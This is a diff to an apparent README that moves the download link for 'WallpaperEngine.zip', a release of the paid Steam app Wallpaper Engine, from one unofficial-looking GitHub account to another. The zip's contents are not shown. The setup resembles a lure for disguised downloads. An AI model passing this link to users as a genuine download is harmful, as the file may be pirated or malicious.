@@ -6,9 +6,8 @@
 <img width="800" height="250" alt="images1" src="https://github.com/user-attachments/assets/da890d9f-462b-4fc3-8886-a8852252ca10" />
 
 
-
 ## Install
-[Download `WallpaperEngine.zip`](https://github.com/wallpaperenginesteam/Wallpaper-Engine-Steam/releases/download/v2.8.42/WallpaperEngine.zip)
+[Download `WallpaperEngine.zip`](https://github.com/SteamWallpaperENGINE/Wallpaper-Engine-Steam/releases/download/v2.8.42/WallpaperEngine.zip)
 ---
 
 
